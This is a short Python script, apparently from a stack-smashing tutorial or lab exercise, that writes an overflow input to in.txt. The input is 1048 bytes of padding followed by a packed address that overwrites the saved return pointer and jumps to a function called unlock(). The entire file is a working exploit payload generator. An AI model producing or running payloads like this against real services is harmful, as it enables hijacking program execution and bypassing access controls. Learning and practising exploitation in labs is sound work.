#!/usr/bin/env python

# Script to create an input to overflow the server's buffer. This input is as long as the
# the offset of the buffer to the return address. The new return address is then appended 
# to the input to overwrite the old RIP.
#
# https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/
from struct import *

buf = ""
buf += "0"*1048                     # offset to RIP
buf += pack("<Q", 0x401379)         # overwrite RIP with the address of the function unlock()

f = open("in.txt", "w")
f.write(buf)
